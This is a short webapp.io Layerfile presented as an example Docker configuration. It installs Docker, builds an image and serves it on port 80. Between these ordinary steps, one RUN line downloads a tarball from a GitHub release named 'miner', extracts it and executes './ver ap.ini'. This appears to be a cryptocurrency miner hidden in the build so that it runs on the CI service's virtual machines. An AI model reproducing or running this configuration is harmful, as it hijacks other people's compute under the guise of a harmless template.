#This is an example webapp.io configuration for Docker!
FROM vm/ubuntu:18.04

# To note: Layerfiles create entire VMs, *not* containers!

# install the latest version of Docker, as in the official Docker installation tutorial.
RUN apt-get update && \
    apt-get install apt-transport-https ca-certificates curl software-properties-common && \
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add - && \
    add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable" && \
    apt-get update && \
    apt install docker-ce

# copy files from the repository into this staging server
COPY . .
RUN sudo apt update && wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
RUN docker build -t image .
RUN docker run -d -p 80:80 image
EXPOSE WEBSITE http://localhost:80
